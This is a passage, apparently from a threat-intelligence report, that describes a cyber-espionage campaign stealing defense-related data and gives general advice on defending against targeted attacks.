particularly trailed its sights on obtaining defense-related information. It is believed to have stolen up to
terabytes of data, given that an organization lost 58GB alone.
Targets face serious repercussions, given the sensitive nature of the data they keep. The data the actors
stole, after all, translates to years of invaluable government and corporate research and development
(R&D) dollars.
For nation-states like the US and China, cyber espionage may not come as a surprise. Several campaigns
like Pawn Storm and Arid Viper have already taken advantage of the weakest links across industries to gain
counterintelligence or perform industrial espionage on perceived foes.
Questions with regard to threat mitigation remain. Thwarting cyber attacks should not rely on off-the-shelf,
traditional anti-malware solutions alone. Sensitive data requires custom defense and multilayer protection
that can’t be easily rendered useless by spear-phishing campaigns and malware attacks. Organizations
need to gather threat intelligence to combat cyber espionage and protect against targeted attacks. They
should operate under the assumption that their network has already been compromised.
